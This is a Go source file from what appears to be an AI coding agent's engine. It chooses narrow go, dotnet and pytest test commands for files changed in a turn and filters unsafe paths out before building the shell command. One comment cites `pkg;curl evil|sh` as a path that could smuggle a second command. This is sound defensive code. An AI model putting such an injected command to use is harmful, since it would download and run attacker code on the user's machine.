package engine

import (
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
)

// The automatic gate used to stop at compiling: code that builds but gets a
// boundary, an error branch or an idempotency rule wrong went through. With
// done_verify_tests on, it also runs the tests of what the turn changed —
// only those, so the check stays proportional to the change:
//
//   - Go: go vet and go test on the packages holding the changed .go files;
//   - .NET: dotnet test on the test projects (name containing "Test") that
//     are, or reference, the project holding a changed .cs file;
//   - Python: pytest on the changed test files and on test_<module>.py of
//     each changed module, when pytest is installed.
//
// Rust and JavaScript are not covered: a crate's tests or a JS test runner
// cannot be narrowed to a change without project-specific configuration.

// maxTestTargets bounds the packages/projects/files one check runs.
const maxTestTargets = 30

// changedFilesThisTurn returns the files this turn wrote or edited, sorted.
func (e *Engine) changedFilesThisTurn() []string {
	e.fileMu.Lock()
	defer e.fileMu.Unlock()
	out := make([]string, 0, len(e.turnChangedFiles))
	for f := range e.turnChangedFiles {
		out = append(out, f)
	}
	sort.Strings(out)
	return out
}

// testCommandsFor returns the test commands for files (absolute paths)
// changed under the project directory dir.
func testCommandsFor(dir string, files []string) []string {
	var goFiles, csFiles, pyFiles []string
	for _, f := range files {
		rel, err := filepath.Rel(dir, f)
		if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
			continue // outside the project
		}
		switch strings.ToLower(filepath.Ext(f)) {
		case ".go":
			goFiles = append(goFiles, f)
		case ".cs":
			csFiles = append(csFiles, f)
		case ".py":
			pyFiles = append(pyFiles, f)
		}
	}
	var cmds []string
	if pkgs := shellSafeTargets(goPackagesFor(dir, goFiles)); len(pkgs) > 0 {
		list := strings.Join(pkgs, " ")
		cmds = append(cmds, "go vet "+list, "go test "+list)
	}
	if projs := dotnetTestProjectsFor(dir, csFiles); len(projs) > 0 {
		for _, p := range projs {
			cmds = append(cmds, fmt.Sprintf("dotnet test %q --nologo -v q", p))
		}
	}
	if tests := shellSafeTargets(pythonTestsFor(dir, pyFiles)); len(tests) > 0 {
		if _, err := exec.LookPath("pytest"); err == nil {
			cmds = append(cmds, "pytest -q "+strings.Join(tests, " "))
		}
	}
	return cmds
}

// goPackagesFor returns "./rel/dir" for each directory holding one of files
// that still has Go files, when dir is a Go module.
func goPackagesFor(dir string, files []string) []string {
	if len(files) == 0 {
		return nil
	}
	if _, err := os.Stat(filepath.Join(dir, "go.mod")); err != nil {
		return nil
	}
	seen := map[string]bool{}
	var pkgs []string
	for _, f := range files {
		d := filepath.Dir(f)
		if seen[d] {
			continue
		}
		seen[d] = true
		if m, _ := filepath.Glob(filepath.Join(d, "*.go")); len(m) == 0 {
			continue // the package was removed
		}
		if isIgnoredGoDir(dir, d) {
			continue
		}
		rel, err := filepath.Rel(dir, d)
		if err != nil {
			continue
		}
		pkg := "./" + filepath.ToSlash(rel)
		if rel == "." {
			pkg = "."
		}
		pkgs = append(pkgs, pkg)
	}
	sort.Strings(pkgs)
	if len(pkgs) > maxTestTargets {
		pkgs = pkgs[:maxTestTargets]
	}
	return pkgs
}

// isIgnoredGoDir reports whether the go tool skips d (a testdata directory,
// or one starting with "." or "_" below dir).
func isIgnoredGoDir(root, d string) bool {
	rel, err := filepath.Rel(root, d)
	if err != nil {
		return true
	}
	for _, part := range strings.Split(filepath.ToSlash(rel), "/") {
		if part == "testdata" || (part != "." && (strings.HasPrefix(part, ".") || strings.HasPrefix(part, "_"))) {
			return true
		}
	}
	return false
}

// dotnetTestProjectsFor returns the test projects (relative to dir) covering
// files: the test project a file is in, and every test project referencing
// the project a file is in.
func dotnetTestProjectsFor(dir string, files []string) []string {
	if len(files) == 0 {
		return nil
	}
	changed := map[string]bool{} // project path -> changed
	for _, f := range files {
		if p := nearestFile(dir, filepath.Dir(f), "*.csproj"); p != "" {
			changed[p] = true
		}
	}
	if len(changed) == 0 {
		return nil
	}
	var out []string
	for _, tp := range findTestProjects(dir) {
		hit := changed[tp]
		if !hit {
			data, err := os.ReadFile(tp)
			if err != nil {
				continue
			}
			body := strings.ReplaceAll(string(data), "\\", "/")
			for p := range changed {
				if strings.Contains(body, "/"+filepath.Base(p)) || strings.Contains(body, "\""+filepath.Base(p)) {
					hit = true
					break
				}
			}
		}
		if hit {
			if rel, err := filepath.Rel(dir, tp); err == nil {
				out = append(out, rel)
			}
		}
	}
	sort.Strings(out)
	if len(out) > maxTestTargets {
		out = out[:maxTestTargets]
	}
	return out
}

// nearestFile returns the first file matching pattern in from or a parent of
// it, not above root.
func nearestFile(root, from, pattern string) string {
	root = filepath.Clean(root)
	for d := filepath.Clean(from); ; d = filepath.Dir(d) {
		if m, _ := filepath.Glob(filepath.Join(d, pattern)); len(m) > 0 {
			sort.Strings(m)
			return m[0]
		}
		if d == root || filepath.Dir(d) == d {
			return ""
		}
	}
}

// findTestProjects lists the *.csproj files under root whose name contains
// "test" (MyApp.Tests.csproj, MyApp.UnitTests.csproj), at most 5 levels deep.
func findTestProjects(root string) []string {
	var out []string
	_ = filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if d.IsDir() {
			name := d.Name()
			rel, _ := filepath.Rel(root, p)
			if p != root && (strings.HasPrefix(name, ".") || name == "bin" || name == "obj" || name == "node_modules" ||
				strings.Count(filepath.ToSlash(rel), "/") >= 5) {
				return filepath.SkipDir
			}
			return nil
		}
		if strings.EqualFold(filepath.Ext(p), ".csproj") && strings.Contains(strings.ToLower(d.Name()), "test") {
			out = append(out, p)
		}
		return nil
	})
	return out
}

// pythonTestsFor returns the pytest targets (relative to dir) for files: a
// changed test file itself, and test_<name>.py next to a changed module or
// in a tests/ directory of the project.
func pythonTestsFor(dir string, files []string) []string {
	seen := map[string]bool{}
	var out []string
	add := func(p string) {
		if _, err := os.Stat(p); err != nil || seen[p] {
			return
		}
		seen[p] = true
		if rel, err := filepath.Rel(dir, p); err == nil {
			out = append(out, filepath.ToSlash(rel))
		}
	}
	for _, f := range files {
		base := filepath.Base(f)
		if strings.HasPrefix(base, "test_") || strings.HasSuffix(base, "_test.py") {
			add(f)
			continue
		}
		name := "test_" + base
		add(filepath.Join(filepath.Dir(f), name))
		add(filepath.Join(filepath.Dir(f), "tests", name))
		add(filepath.Join(dir, "tests", name))
	}
	sort.Strings(out)
	if len(out) > maxTestTargets {
		out = out[:maxTestTargets]
	}
	return out
}

// shellSafeTarget is the character set a package path or test file may use to
// be spliced unquoted into the verify command line. The paths come from the
// files the model wrote; a directory named `pkg;curl evil|sh` or `my tool`
// would otherwise run as a second command or split into two arguments.
var shellSafeTarget = regexp.MustCompile(`^[A-Za-z0-9._/-]+$`)

func shellSafeTargets(targets []string) []string {
	out := targets[:0:0]
	for _, t := range targets {
		if shellSafeTarget.MatchString(t) && !strings.Contains(t, "..") {
			out = append(out, t)
		}
	}
	return out
}
